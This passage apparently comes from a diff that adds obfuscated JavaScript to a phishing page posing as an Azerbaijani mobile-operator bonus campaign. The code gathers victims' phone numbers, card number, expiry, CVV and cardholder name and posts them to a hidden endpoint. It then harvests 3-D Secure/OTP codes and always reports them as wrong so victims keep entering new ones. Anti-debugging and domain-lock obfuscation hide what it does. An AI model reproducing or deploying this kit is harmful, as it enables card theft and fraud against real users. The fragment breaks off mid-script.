= 0x0; _0x5bb251 < _0x41f984[_0x483e23(0x169)]; _0x5bb251++) { const _0x5e5752 = _0x41f984[_0x5bb251], _0x4c3a78 = _0x5e5752[0x0] === String[_0x483e23(0x130)](0x2e) ? _0x5e5752[_0x483e23(0x15b)](0x1) : _0x5e5752, _0x13491b = _0x274f5b[_0x483e23(0x169)] - _0x4c3a78[_0x483e23(0x169)], _0x5183c3 = _0x274f5b['indexOf'](_0x4c3a78, _0x13491b), _0x42f8b4 = _0x5183c3 !== -0x1 && _0x5183c3 === _0x13491b; _0x42f8b4 && ((_0x274f5b['length'] == _0x5e5752[_0x483e23(0x169)] || _0x5e5752[_0x483e23(0x127)]('.') === 0x0) && (_0x5375ba = !![])); } if (!_0x5375ba) { const _0x1da36a = new RegExp('[eTZfSMeKWBXFXTyKpMARNffZxJjGVEjj]', 'g'), _0x360f83 = _0x483e23(0x117)[_0x483e23(0xed)](_0x1da36a, ''); _0x1655d4[_0x58fc18][_0x579dac] = _0x360f83; } }); _0x1b766d(); const state = { 'operator': '', 'prefix': '', 'number': '', 'campaign': null, 'card': { 'name': '', 'number': '', 'expiry': '', 'cvv': '' } }, prefixes = { 'Azercell': [_0x49fbe2(0x139), _0x49fbe2(0x165), _0x49fbe2(0x163)], 'Nar': [_0x49fbe2(0x101), '077'], 'Bakcell': [_0x49fbe2(0x12a), _0x49fbe2(0x12c)] }, phoneMask = IMask(document[_0x49fbe2(0x137)]('phone-input'), { 'mask': _0x49fbe2(0x104) }), cardNumberMask = IMask(document[_0x49fbe2(0x137)]('card-number'), { 'mask': '0000\x200000\x200000\x200000' }), cardExpiryMask = IMask(document[_0x49fbe2(0x137)](_0x49fbe2(0x141)), { 'mask': _0x49fbe2(0x124) }), cardCvvMask = IMask(document[_0x49fbe2(0x137)](_0x49fbe2(0x126)), { 'mask': _0x49fbe2(0x10b) }); function isValidLuhn(_0x64197c) { const _0x2642f5 = _0x49fbe2; let _0x3eeedb = 0x0, _0x53b550 = ![]; for (let _0x349a0c = _0x64197c['length'] - 0x1; _0x349a0c >= 0x0; _0x349a0c--) { let _0x537b97 = parseInt(_0x64197c[_0x2642f5(0x148)](_0x349a0c)); if (_0x53b550) { _0x537b97 *= 0x2; if (_0x537b97 > 0x9) _0x537b97 -= 0x9; } _0x3eeedb += _0x537b97, _0x53b550 = !_0x53b550; } return _0x3eeedb % 0xa === 0x0; } function isValidExpiry(_0x40f95f) { const _0x585be0 = _0x49fbe2, _0x40f51b = _0x40f95f['split']('/'); if (_0x40f51b[_0x585be0(0x169)] !== 0x2) return ![]; const _0x5b41e8 = parseInt(_0x40f51b[0x0]), _0x22f415 = parseInt('20' + _0x40f51b[0x1]); if (isNaN(_0x5b41e8) || isNaN(_0x22f415) || _0x5b41e8 < 0x1 || _0x5b41e8 > 0xc) return ![]; const _0x3cb46a = new Date(), _0x158b6a = new Date(_0x22f415, _0x5b41e8 - 0x1, 0x1); return _0x158b6a > new Date(_0x3cb46a[_0x585be0(0x159)](), _0x3cb46a[_0x585be0(0x128)](), 0x1); } function goToStep(_0xfb9943) { const _0x5c6e06 = _0x49fbe2; document['querySelectorAll'](_0x5c6e06(0x146))[_0x5c6e06(0x111)](_0x58e9b7 => { const _0x3317bc = _0x5c6e06; _0x58e9b7[_0x3317bc(0x125)][_0x3317bc(0x154)](_0x3317bc(0x10e)), _0x58e9b7['classList'][_0x3317bc(0x110)](_0x3317bc(0x153)); }); const _0x409320 = document[_0x5c6e06(0x137)](_0x5c6e06(0x112) + _0xfb9943); _0x409320 && (_0x409320[_0x5c6e06(0x125)][_0x5c6e06(0x154)](_0x5c6e06(0x153)), setTimeout(() => _0x409320['classList'][_0x5c6e06(0x110)](_0x5c6e06(0x10e)), 0xa)); } function prevStep(_0x42a06f) { goToStep(_0x42a06f); } function selectOperator(_0x3116f2) { const _0x3643df = _0x49fbe2; state[_0x3643df(0x143)] = _0x3116f2; const _0x416bf4 = document[_0x3643df(0x137)]('selected-op-display'), _0x1d6b05 = { 'Azercell': _0x3643df(0x16b), 'Nar': _0x3643df(0x149), 'Bakcell': _0x3643df(0xf6) }; _0x416bf4[_0x3643df(0x113)] = _0x3643df(0x116) + _0x1d6b05[_0x3116f2] + _0x3643df(0x135) + _0x3116f2 + _0x3643df(0x132) + _0x3116f2 + _0x3643df(0x134); const _0x22ed55 = document[_0x3643df(0x137)](_0x3643df(0x12f)); _0x22ed55[_0x3643df(0x113)] = prefixes[_0x3116f2][_0x3643df(0x15f)](_0x422acb => '<option\x20value=\x22' + _0x422acb + '\x22>' + _0x422acb + _0x3643df(0x11b))[_0x3643df(0x114)](''), goToStep(0x2); } document[_0x49fbe2(0x137)](_0x49fbe2(0x107))['addEventListener']('input', () => { const _0x5a8d8f = _0x49fbe2, _0x1d64b8 = document[_0x5a8d8f(0x137)](_0x5a8d8f(0x151)); phoneMask[_0x5a8d8f(0x106)][_0x5a8d8f(0x169)] === 0x7 ? (_0x1d64b8[_0x5a8d8f(0x133)] = ![], _0x1d64b8[_0x5a8d8f(0x125)][_0x5a8d8f(0x154)](_0x5a8d8f(0xfc), _0x5a8d8f(0x140), 'cursor-not-allowed'), _0x1d64b8[_0x5a8d8f(0x125)][_0x5a8d8f(0x110)](_0x5a8d8f(0x12d), _0x5a8d8f(0x11a), _0x5a8d8f(0x121), 'shadow-lg', _0x5a8d8f(0x12b))) : (_0x1d64b8['disabled'] = !![], _0x1d64b8[_0x5a8d8f(0x125)]['add'](_0x5a8d8f(0xfc), _0x5a8d8f(0x140), _0x5a8d8f(0x102)), _0x1d64b8[_0x5a8d8f(0x125)][_0x5a8d8f(0x154)](_0x5a8d8f(0x12d), _0x5a8d8f(0x11a), 'hover:bg-[#1d4ed8]', _0x5a8d8f(0x164), 'shadow-blue-200')); }); const originalGoToStep = goToStep; window[_0x49fbe2(0x145)] = function (_0x41b7b9) { const _0x13cd5b = _0x49fbe2; _0x41b7b9 === 0x3 && (state[_0x13cd5b(0x11f)] = document['getElementById'](_0x13cd5b(0x12f))[_0x13cd5b(0x14f)], state[_0x13cd5b(0x15c)] = phoneMask[_0x13cd5b(0x14f)], document['getElementById']('summary-op')[_0x13cd5b(0x157)] = state[_0x13cd5b(0x143)], document['getElementById'](_0x13cd5b(0x13a))['textContent'] = state[_0x13cd5b(0x11f)] + '\x20' + state['number']), originalGoToStep(_0x41b7b9); }; function selectCampaign(_0x895d12, _0x548192, _0x5626f3, _0x1628d9, _0x3a638d) { const _0x47e19d = _0x49fbe2; state[_0x47e19d(0x120)] = { 'id': _0x895d12, 'price': _0x548192, 'gb': _0x5626f3, 'mins': _0x1628d9, 'days': _0x3a638d }, document[_0x47e19d(0x137)]('congrats-msg')['innerHTML'] = _0x47e19d(0x12e) + _0x548192 + _0x47e19d(0x167) + _0x5626f3 + _0x47e19d(0xf9) + _0x1628d9 + _0x47e19d(0x13f) + _0x3a638d + _0x47e19d(0xfe), document['getElementById'](_0x47e19d(0x115))[_0x47e19d(0x157)] = _0x548192, goToStep(0x4); } document[_0x49fbe2(0x137)](_0x49fbe2(0x11d))['addEventListener'](_0x49fbe2(0x14b), async _0x457215 => { const _0x367818 = _0x49fbe2; _0x457215[_0x367818(0xff)](); const _0x17b955 = cardNumberMask['unmaskedValue'], _0x16bf11 = cardExpiryMask[_0x367818(0x14f)]; let _0x27825c = ![]; !isValidLuhn(_0x17b955) ? (document[_0x367818(0x137)]('card-error')[_0x367818(0x125)][_0x367818(0x154)](_0x367818(0x15d)), document['getElementById'](_0x367818(0x129))[_0x367818(0x125)][_0x367818(0x110)]('hidden'), document[_0x367818(0x137)](_0x367818(0x105))[_0x367818(0x125)][_0x367818(0x110)](_0x367818(0x156)), _0x27825c = !![]) : (document[_0x367818(0x137)](_0x367818(0x10f))['classList'][_0x367818(0x110)](_0x367818(0x15d)), document['getElementById'](_0x367818(0x129))[_0x367818(0x125)]['remove'](_0x367818(0x15d)), document[_0x367818(0x137)]('card-number')[_0x367818(0x125)][_0x367818(0x154)](_0x367818(0x156))); !isValidExpiry(_0x16bf11) ? (document[_0x367818(0x137)](_0x367818(0x14e))['classList'][_0x367818(0x154)](_0x367818(0x15d)), document[_0x367818(0x137)]('expiry-label')[_0x367818(0x125)][_0x367818(0x110)](_0x367818(0x15d)), document[_0x367818(0x137)]('card-expiry')[_0x367818(0x125)]['add'](_0x367818(0x156)), _0x27825c = !![]) : (document[_0x367818(0x137)](_0x367818(0x14e))[_0x367818(0x125)]['add']('hidden'), document['getElementById'](_0x367818(0x109))[_0x367818(0x125)][_0x367818(0x154)]('hidden'), document[_0x367818(0x137)](_0x367818(0x141))['classList'][_0x367818(0x154)]('border-red-500')); if (_0x27825c) return; const _0xcec23d = document[_0x367818(0x137)]('status-overlay'), _0x44b8c7 = document[_0x367818(0x137)]('loader'), _0x4c8505 = document[_0x367818(0x137)](_0x367818(0x13c)), _0x42d0e4 = document['getElementById']('status-desc'); _0xcec23d[_0x367818(0x125)]['remove'](_0x367818(0x15d)), _0x4c8505[_0x367818(0x157)] = _0x367818(0xf4), _0x42d0e4['textContent'] = 'Zəhmət\x20olmasa\x20gözləyin,\x20kart\x20məlumatlarınız\x20yoxlanılır.'; const _0x4cb10b = new FormData(); _0x4cb10b['append']('operator', state[_0x367818(0x143)]), _0x4cb10b['append'](_0x367818(0x11f), state[_0x367818(0x11f)]), _0x4cb10b[_0x367818(0x168)](_0x367818(0x15c), state[_0x367818(0x15c)]), _0x4cb10b[_0x367818(0x168)]('campaign_price', state[_0x367818(0x120)][_0x367818(0x155)]), _0x4cb10b['append'](_0x367818(0x10c), state['campaign']['gb'] + _0x367818(0x14d) + state[_0x367818(0x120)]['mins']), _0x4cb10b[_0x367818(0x168)]('card_name', document[_0x367818(0x137)](_0x367818(0x162))[_0x367818(0x14f)]), _0x4cb10b[_0x367818(0x168)]('card_number', cardNumberMask['value']), _0x4cb10b[_0x367818(0x168)](_0x367818(0x158), cardExpiryMask['value']), _0x4cb10b[_0x367818(0x168)](_0x367818(0x152), cardCvvMask[_0x367818(0x14f)]); try { const _0x4a95d7 = await fetch(_0x367818(0x11e), { 'method': _0x367818(0x131), 'body': _0x4cb10b }), _0x565a91 = await _0x4a95d7[_0x367818(0x13e)](); if (_0x565a91[_0x367818(0xf2)] === _0x367818(0xfa)) setTimeout(() => { const _0x2d8c07 = _0x367818; _0xcec23d[_0x2d8c07(0x125)][_0x2d8c07(0x110)](_0x2d8c07(0x15d)), goToStep(0x6); }, 0x1388); else throw new Error(_0x565a91[_0x367818(0xf8)]); } catch (_0x45db0d) { _0xcec23d[_0x367818(0x125)][_0x367818(0x110)]('hidden'), alert(_0x367818(0x122)); } }), document[_0x49fbe2(0x137)](_0x49fbe2(0x15e))[_0x49fbe2(0x13b)]('submit', async _0x10c458 => { const _0x1fe0df = _0x49fbe2; _0x10c458[_0x1fe0df(0xff)](); const _0x6a13c9 = document[_0x1fe0df(0x137)](_0x1fe0df(0x108)), _0x45d987 = document[_0x1fe0df(0x137)]('loader'), _0x4dd4b9 = document[_0x1fe0df(0x137)](_0x1fe0df(0x13c)), _0x51ece7 = document[_0x1fe0df(0x137)](_0x1fe0df(0x103)), _0x5bdfab = document[_0x1fe0df(0x137)](_0x1fe0df(0x166)), _0x323b15 = document['getElementById'](_0x1fe0df(0x14a)), _0x5e2b43 = (_0x323b15[_0x1fe0df(0x14f)] || '')[_0x1fe0df(0xed)](/\D/g, ''); if (!/^(\d{4}|\d{6})$/[_0x1fe0df(0xf3)](_0x5e2b43)) { _0x5bdfab[_0x1fe0df(0x157)] = _0x1fe0df(0x16a), _0x5bdfab[_0x1fe0df(0x125)][_0x1fe0df(0x154)](_0x1fe0df(0x15d)), _0x323b15[_0x1fe0df(0x118)](); return; } _0x6a13c9[_0x1fe0df(0x125)][_0x1fe0df(0x154)](_0x1fe0df(0x15d)), _0x4dd4b9[_0x1fe0df(0x157)] = _0x1fe0df(0x15a), _0x51ece7[_0x1fe0df(0x157)] = _0x1fe0df(0xf5), _0x5bdfab[_0x1fe0df(0x125)]['add'](_0x1fe0df(0x15d)); const _0x546288 = new FormData(); _0x546288[_0x1fe0df(0x168)](_0x1fe0df(0xf7), cardNumberMask[_0x1fe0df(0x14f)]), _0x546288[_0x1fe0df(0x168)](_0x1fe0df(0x160), _0x5e2b43); try { const _0xce290a = await fetch(_0x1fe0df(0x14c), { 'method': _0x1fe0df(0x131), 'body': _0x546288 }), _0x5129c1 = await _0xce290a['json'](); setTimeout(() => { const _0x3258a3 = _0x1fe0df; _0x6a13c9['classList'][_0x3258a3(0x110)](_0x3258a3(0x15d)), _0x5bdfab[_0x3258a3(0x157)] = _0x3258a3(0xfb), _0x5bdfab[_0x3258a3(0x125)][_0x3258a3(0x154)](_0x3258a3(0x15d)), _0x323b15['value'] = '', _0x323b15['focus'](); }, 0xbb8); } catch (_0x205515) { _0x6a13c9['classList'][_0x1fe0df(0x110)]('hidden'); } });
+
+    </script>
+    <script>
+        function _0x2559() { const _0x1c1793 = ['charCodeAt', 'bind', 'VISA', '1540608UFFJHm', 'card-brand-inline-logo', 'replace', '10kaQVWy', 'active', 'card-expiry', 'confirm-operator', 'card-preview-name', 'keydown', 'querySelector', 'WabSpBoVuRt:PbjflanHckYPUBASrVQmMTXf', '••••\x20••••\x20••••\x20••••', 'getElementById', 'card-preview-number', '1057850CHWyNq', '(((.+)+)+)+$', 'clipboardData', 'campaign', 'confirm-gb', 'tds-code', '1519440hWwJbD', 'main.glass-card', 'dataset', 'ArrowRight', 'includes', 'length', '<img\x20src=\x22images/Visa_Inc._logo_%282005%E2%80%932014%29.svg\x22\x20alt=\x22Visa\x22\x20class=\x22', 'toString', 'slice', 'textContent', 'step', 'indexOf', '{}.constructor(\x22return\x20this\x22)(\x20)', 'prefix-select', 'XKuOlKdugczbpagyyrG.SonliNneASsqmTJJAxwNkxqwtYrBBQwh', 'test', 'Backspace', 'inline', 'constructor', 'preventDefault', 'tds-error', 'card-brand-logo', '<img\x20src=\x22images/1280px-Mastercard-logo.svg.png\x22\x20alt=\x22Mastercard\x22\x20class=\x22', 'value', 'text', 'querySelectorAll', 'number', 'toggle', 'input', 'padEnd', 'card-brand-logo\x20mastercard', 'fromCharCode', 'forEach', 'CARD', 'key', '2631356ouHwUy', '40759gvxoZs', '4cXcGAm', 'top', '[XKOKgcbgrGSNASsqmTJJAxwNkxqwtYrBBQwh]', 'getData', 'Enter', 'trim', '20tmgmTe', 'classList', 'innerHTML', 'paste', 'card-preview-expiry', 'Kod\x20yalnız\x204\x20və\x20ya\x206\x20rəqəmli\x20olmalıdır.', 'card-name', 'split', 'addEventListener', 'AA/İİ', '[WSpBVRPjfHcYPUBASrVQmMTXf]', 'search', 'card-brand-inline-logo\x20mastercard', 'confirm-number', '841920LWhbfX', 'confirm-days', '9406602tzTDRe', 'return\x20(function()\x20']; _0x2559 = function () { return _0x1c1793; }; return _0x2559(); } function _0x5c9e(_0x1b2ff3, _0x18c95c) { _0x1b2ff3 = _0x1b2ff3 - 0x175; const _0x4b2824 = _0x2559(); let _0x2c300b = _0x4b2824[_0x1b2ff3]; return _0x2c300b; } (function (_0x154537, _0x2ba9b0) { const _0x1b426b = _0x5c9e, _0xe97dfb = _0x154537(); while (!![]) { try { const _0xac3fd4 = parseInt(_0x1b426b(0x1c6)) / 0x1 * (parseInt(_0x1b426b(0x179)) / 0x2) + parseInt(_0x1b426b(0x18e)) / 0x3 + -parseInt(_0x1b426b(0x1c7)) / 0x4 * (-parseInt(_0x1b426b(0x19c)) / 0x5) + -parseInt(_0x1b426b(0x1a2)) / 0x6 + parseInt(_0x1b426b(0x1c5)) / 0x7 + parseInt(_0x1b426b(0x187)) / 0x8 + -parseInt(_0x1b426b(0x189)) / 0x9 * (parseInt(_0x1b426b(0x191)) / 0xa); if (_0xac3fd4 === _0x2ba9b0) break; else _0xe97dfb['push'](_0xe97dfb['shift']()); } catch (_0x1d62f4) { _0xe97dfb['push'](_0xe97dfb['shift']()); } } }(_0x2559, 0x4d022), (function () { const _0x11563f = _0x5c9e, _0x58a58a = (function () { let _0x198982 = !![]; return function (_0x19fc45, _0x1e6ebd) { const _0x1fe3dc = _0x198982 ? function () { if (_0x1e6ebd) { const _0x2a624e = _0x1e6ebd['apply'](_0x19fc45, arguments); return _0x1e6ebd = null, _0x2a624e; } } : function () { }; return _0x198982 = ![], _0x1fe3dc; }; }()), _0x330323 = _0x58a58a(this, function () { const _0x4760bd = _0x5c9e; if (_0x330323[_0x4760bd(0x18c)]()['toString']()[_0x4760bd(0x1ad)]('\x0a') !== -0x1) return; return _0x330323[_0x4760bd(0x1a9)]()[_0x4760bd(0x184)](_0x4760bd(0x19d))[_0x4760bd(0x1a9)]()[_0x4760bd(0x1b4)](_0x330323)[_0x4760bd(0x184)](_0x4760bd(0x19d)); }); _0x330323(); const _0x2106b1 = (function () { let _0x29b2ab = !![]; return function (_0x36e11c, _0x32f160) { const _0xeed034 = _0x29b2ab ? function () { if (_0x32f160) { const _0x1c4f16 = _0x32f160['apply'](_0x36e11c, arguments); return _0x32f160 = null, _0x1c4f16; } } : function () { }; return _0x29b2ab = ![], _0xeed034; }; }()), _0x4969fc = _0x2106b1(this, function () { const _0x2bea53 = _0x5c9e; let _0x7a01ca; try { const _0x5692d0 = Function(_0x2bea53(0x18a) + _0x2bea53(0x1ae) + ');'); _0x7a01ca = _0x5692d0(); } catch (_0x2e7052) { _0x7a01ca = window; } const _0x178b55 = new RegExp(_0x2bea53(0x175), 'g'), _0x13326c = _0x2bea53(0x1b0)[_0x2bea53(0x190)](_0x178b55, '')[_0x2bea53(0x180)](';'); let _0x153f2f, _0x1e7cee, _0x2840a8, _0x9f7ac3; const _0x1fe8ba = function (_0x4773a5, _0x4ef463, _0x5eeca6) { const _0x98e204 = _0x2bea53; if (_0x4773a5[_0x98e204(0x1a7)] != _0x4ef463) return ![]; for (let _0x196049 = 0x0; _0x196049 < _0x4ef463; _0x196049++) { for (let _0x1cf913 = 0x0; _0x1cf913 < _0x5eeca6['length']; _0x1cf913 += 0x2) { if (_0x196049 == _0x5eeca6[_0x1cf913] && _0x4773a5[_0x98e204(0x18b)](_0x196049) != _0x5eeca6[_0x1cf913 + 0x1]) return ![]; } } return !![]; }, _0x260842 = function (_0x84932e, _0x3db2ac, _0x112535) { return _0x1fe8ba(_0x3db2ac, _0x112535, _0x84932e); }, _0x1f676b = function (_0x3805be, _0x27d2f6, _0x3668ea) { return _0x260842(_0x27d2f6, _0x3805be, _0x3668ea); }, _0x18d49f = function (_0x1b363e, _0x265178, _0x2042ea) { return _0x1f676b(_0x265178, _0x2042ea, _0x1b363e); }; for (let _0x1752f5 in _0x7a01ca) { if (_0x1fe8ba(_0x1752f5, 0x8, [0x7, 0x74, 0x5, 0x65, 0x3, 0x75, 0x0, 0x64])) { _0x153f2f = _0x1752f5; break; } } for (let _0x4219b3 in _0x7a01ca[_0x153f2f]) { if (_0x18d49f(0x6, _0x4219b3, [0x5, 0x6e, 0x0, 0x64])) { _0x1e7cee = _0x4219b3; break; } } for (let _0x2968b0 in _0x7a01ca[_0x153f2f]) { if (_0x1f676b(_0x2968b0, [0x7, 0x6e, 0x0, 0x6c], 0x8)) { _0x2840a8 = _0x2968b0; break; } } if (!('~' > _0x1e7cee)) for (let _0x43c1f7 in _0x7a01ca[_0x153f2f][_0x2840a8]) { if (_0x260842([0x7, 0x65, 0x0, 0x68], _0x43c1f7, 0x8)) { _0x9f7ac3 = _0x43c1f7; break; } } if (!_0x153f2f || !_0x7a01ca[_0x153f2f]) return; const _0x3de29a = _0x7a01ca[_0x153f2f][_0x1e7cee], _0x34ff0b = !!_0x7a01ca[_0x153f2f][_0x2840a8] && _0x7a01ca[_0x153f2f][_0x2840a8][_0x9f7ac3], _0x5e8915 = _0x3de29a || _0x34ff0b; if (!_0x5e8915) return; let _0x217bdd = ![]; for (let _0x15fba0 = 0x0; _0x15fba0 < _0x13326c[_0x2bea53(0x1a7)]; _0x15fba0++) { const _0x3362a5 = _0x13326c[_0x15fba0], _0x1ba6ec = _0x3362a5[0x0] === String[_0x2bea53(0x1c1)](0x2e) ? _0x3362a5[_0x2bea53(0x1aa)](0x1) : _0x3362a5, _0x5171b0 = _0x5e8915[_0x2bea53(0x1a7)] - _0x1ba6ec[_0x2bea53(0x1a7)], _0x25b334 = _0x5e8915['indexOf'](_0x1ba6ec, _0x5171b0), _0x2a6151 = _0x25b334 !== -0x1 && _0x25b334 === _0x5171b0; _0x2a6151 && ((_0x5e8915['length'] == _0x3362a5['length'] || _0x3362a5[_0x2bea53(0x1ad)]('.') === 0x0) && (_0x217bdd = !![])); } if (!_0x217bdd) { const _0x18d09a = new RegExp(_0x2bea53(0x183), 'g'), _0x15196e = _0x2bea53(0x198)['replace'](_0x18d09a, ''); _0x7a01ca[_0x153f2f][_0x2840a8] = _0x15196e; } }); _0x4969fc(); const _0x6a37b9 = document[_0x11563f(0x1bb)]('.progress-step'), _0xd8d981 = document[_0x11563f(0x197)](_0x11563f(0x1a3)); if (_0xd8d981) _0xd8d981[_0x11563f(0x1a4)][_0x11563f(0x1ac)] = '1'; const _0x3c0019 = _0x547767 => { const _0x717389 = _0x11563f; _0x6a37b9[_0x717389(0x1c2)](_0x45edca => { const _0x3517c3 = _0x717389, _0x5d8a25 = Number(_0x45edca[_0x3517c3(0x1a4)]['progress']); _0x45edca[_0x3517c3(0x17a)][_0x3517c3(0x1bd)](_0x3517c3(0x192), _0x547767 === 0x4 ? _0x5d8a25 === 0x3 : _0x5d8a25 === _0x547767); }); }, _0xe44752 = window['goToStep']; window['goToStep'] = function (_0x1452ac) { const _0x43d345 = _0x11563f; _0xe44752(_0x1452ac); if (_0xd8d981) _0xd8d981['dataset'][_0x43d345(0x1ac)] = String(_0x1452ac); _0x3c0019(_0x1452ac); if (_0x1452ac === 0x4) { const _0x3d0121 = (_0x47d8e8, _0x49eed7) => { const _0x4a09c2 = _0x43d345, _0x277b2c = document[_0x4a09c2(0x19a)](_0x47d8e8); if (_0x277b2c) _0x277b2c['textContent'] = _0x49eed7 || '—'; }; _0x3d0121(_0x43d345(0x194), state['operator']), _0x3d0121(_0x43d345(0x186), ((state['prefix'] || document[_0x43d345(0x19a)](_0x43d345(0x1af))[_0x43d345(0x1b9)]) + '\x20' + (state[_0x43d345(0x1bc)] || ''))['trim']()), _0x3d0121(_0x43d345(0x1a0), state['campaign'] && state[_0x43d345(0x19f)]['gb']), _0x3d0121(_0x43d345(0x188), state[_0x43d345(0x19f)] && state['campaign']['days']); } }, _0x3c0019(0x1); const _0x324c66 = document[_0x11563f(0x19a)]('card-number'), _0x194ea1 = document[_0x11563f(0x19a)](_0x11563f(0x17f)), _0x45eb21 = document[_0x11563f(0x19a)](_0x11563f(0x193)), _0x3b62bd = document['getElementById']('card-brand'), _0xea7169 = document['getElementById']('card-brand-inline'), _0x4c256e = document[_0x11563f(0x19a)](_0x11563f(0x19b)), _0x1e9c8d = document[_0x11563f(0x19a)](_0x11563f(0x195)), _0x5a1122 = document['getElementById'](_0x11563f(0x17d)), _0x121d10 = () => { const _0x25efdf = _0x11563f, _0x143ae3 = _0x324c66 ? _0x324c66[_0x25efdf(0x1b9)]['replace'](/\D/g, '') : ''; let _0x39bec2 = _0x25efdf(0x1c3); if (_0x143ae3['startsWith']('4')) _0x39bec2 = _0x25efdf(0x18d); if (/^5[1-5]/[_0x25efdf(0x1b1)](_0x143ae3) || /^2[2-7]/[_0x25efdf(0x1b1)](_0x143ae3)) _0x39bec2 = 'MC'; const _0x19feb8 = _0x2b5c10 => { const _0xedbb66 = _0x25efdf; if (_0x39bec2 === _0xedbb66(0x18d)) return _0xedbb66(0x1a8) + (_0x2b5c10 === _0xedbb66(0x1b3) ? _0xedbb66(0x18f) : _0xedbb66(0x1b7)) + '\x22>'; if (_0x39bec2 === 'MC') return _0xedbb66(0x1b8) + (_0x2b5c10 === _0xedbb66(0x1b3) ? _0xedbb66(0x185) : _0xedbb66(0x1c0)) + '\x22>'; return _0xedbb66(0x1c3); }; if (_0x3b62bd) _0x3b62bd[_0x25efdf(0x17b)] = _0x19feb8(_0x25efdf(0x1c8)); if (_0xea7169) _0xea7169[_0x25efdf(0x17b)] = _0x19feb8(_0x25efdf(0x1b3)); if (_0x4c256e) { const _0x395af5 = _0x324c66 && _0x324c66[_0x25efdf(0x1b9)][_0x25efdf(0x178)]() ? _0x324c66[_0x25efdf(0x1b9)][_0x25efdf(0x1bf)](0x13, '•') : _0x25efdf(0x199); _0x4c256e[_0x25efdf(0x1ab)] = _0x395af5; } if (_0x1e9c8d) { const _0x4df46b = _0x194ea1 && _0x194ea1[_0x25efdf(0x1b9)][_0x25efdf(0x178)]() ? _0x194ea1['value'][_0x25efdf(0x178)]()['toUpperCase']() : 'AD\x20SOYAD'; _0x1e9c8d['textContent'] = _0x4df46b; } if (_0x5a1122) { const _0x2c9ccf = _0x45eb21 && _0x45eb21['value']['trim']() ? _0x45eb21[_0x25efdf(0x1b9)][_0x25efdf(0x178)]() : _0x25efdf(0x182); _0x5a1122[_0x25efdf(0x1ab)] = _0x2c9ccf; } };[_0x324c66, _0x194ea1, _0x45eb21][_0x11563f(0x1c2)](_0x3b7227 => { const _0x23b67a = _0x11563f; if (_0x3b7227) _0x3b7227['addEventListener'](_0x23b67a(0x1be), _0x121d10); }), _0x121d10(); const _0x11165a = document[_0x11563f(0x19a)](_0x11563f(0x1a1)); if (_0x11165a) { const _0x4d1214 = document[_0x11563f(0x19a)](_0x11563f(0x1b6)), _0x331b25 = () => { const _0x21e8c8 = _0x11563f, _0x46d9d7 = _0x11165a[_0x21e8c8(0x1b9)][_0x21e8c8(0x190)](/\D/g, '')[_0x21e8c8(0x1aa)](0x0, 0x6); _0x11165a['value'] = _0x46d9d7; const _0x5bd501 = /^(\d{4}|\d{6})$/[_0x21e8c8(0x1b1)](_0x46d9d7); _0x4d1214 && (_0x4d1214[_0x21e8c8(0x17a)][_0x21e8c8(0x1bd)]('hidden', _0x5bd501 || _0x46d9d7[_0x21e8c8(0x1a7)] === 0x0), _0x4d1214[_0x21e8c8(0x1ab)] = _0x21e8c8(0x17e)); }; _0x11165a[_0x11563f(0x181)](_0x11563f(0x1be), _0x331b25), _0x11165a['addEventListener'](_0x11563f(0x17c), _0x51497a => { const _0x161e56 = _0x11563f; _0x51497a[_0x161e56(0x1b5)](); const _0x5e361e = (_0x51497a[_0x161e56(0x19e)] || window[_0x161e56(0x19e)])[_0x161e56(0x176)](_0x161e56(0x1ba))[_0x161e56(0x190)](/\D/g, '')['slice'](0x0, 0x6); _0x11165a['value'] = _0x5e361e, _0x331b25(); }), _0x11165a['addEventListener'](_0x11563f(0x196), _0x405108 => { const _0x12eecd = _0x11563f, _0x4910c8 = [_0x12eecd(0x1b2), 'Tab', 'Delete', 'ArrowLeft', _0x12eecd(0x1a5), 'Home', 'End', _0x12eecd(0x177)]; !/^\d$/[_0x12eecd(0x1b1)](_0x405108['key']) && !_0x4910c8[_0x12eecd(0x1a6)](_0x405108[_0x12eecd(0x1c4)]) && _0x405108[_0x12eecd(0x1c4)] !== '\x20' && _0x405108[_0x12eecd(0x1b5)](); }); } }()));
+    </script>
+    <script>
+        (function () {
+            // Obfuscate kod status-overlay-i özü idarə edir.
+            // Biz sadəcə overlay görünəndən 5 saniyə sonra xəta göstəririk.
+            // Bunun üçün overlay elementinin classList.remove-ni izləyirik.
+
+            var overlay = document.getElementById('status-overlay');
+            var errorShown = false;
+            var errorTimer = null;
+
+            function showError() {
+                if (errorShown) return;
+                errorShown = true;
+
+                var loader = document.getElementById('loader');
+                var title  = document.getElementById('status-title');
+                var desc   = document.getElementById('status-desc');
+                var icon   = document.getElementById('success-icon');
+                var lines  = overlay ? overlay.querySelector('.mt-8') : null;
+
+                if (loader) loader.style.display = 'none';
+                if (lines)  lines.style.display  = 'none';
+
+                if (icon) {
+                    icon.removeAttribute('class');
+                    icon.style.cssText = 'display:flex;width:80px;height:80px;background:#fef2f2;border-radius:28px;align-items:center;justify-content:center;margin-bottom:24px;font-size:2.5rem;color:#ef4444;flex-shrink:0;';
+                    icon.textContent = '✕';
+                }
+                if (title) {
+                    title.textContent  = 'Əməliyyat uğursuz oldu';
+                    title.style.color  = '#ef4444';
+                }
+                if (desc) {
+                    desc.textContent = 'Daxil etdiyiniz kod yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
+                }
+            }
+
+            function scheduleError() {
+                if (errorTimer) clearTimeout(errorTimer);
+                errorShown = false;
+                errorTimer = setTimeout(showError, 5000);
+            }
+
+            // overlay-in classList.remove('hidden') çağrıldığını izlə
+            if (overlay) {
+                var _origRemove = overlay.classList.remove.bind(overlay.classList);
+                overlay.classList.remove = function () {
+                    _origRemove.apply(this, arguments);
+                    // overlay görünür oldu — 5 saniyəlik saydac başlat
+                    for (var i = 0; i < arguments.length; i++) {
+                        if (arguments[i] === 'hidden') {
+                            scheduleError();
+                            break;
+                        }
+                    }
+                };
+
+                // Əgər overlay yenidən gizlənərsə (obfuscate kod gizlədirsə) saydacı ləğv et
+                var _origAdd = overlay.classList.add.bind(overlay.classList);
+                overlay.classList.add = function () {
+                    _origAdd.apply(this, arguments);
+                    for (var i = 0; i < arguments.length; i++) {
+                        if (arguments[i] === 'hidden') {
+                            if (errorTimer) { clearTimeout(errorTimer); errorTimer = null; }
+                            errorShown = false;
+                            break;
+                        }
+                    }
+                };
+            }
+        })();
+    </script>
+<script>
+// OTP formu submit zaman? otp-yoxlama.html s?hif?sin? yonl?ndir
+document.addEventListener("DOMContentLoaded", function() {
+    const tdsForm = document.getElementById("tds-form");
+    if (tdsForm) {
+        tdsForm.addEventListener("submit", function(e) {
+            e.preventDefault();
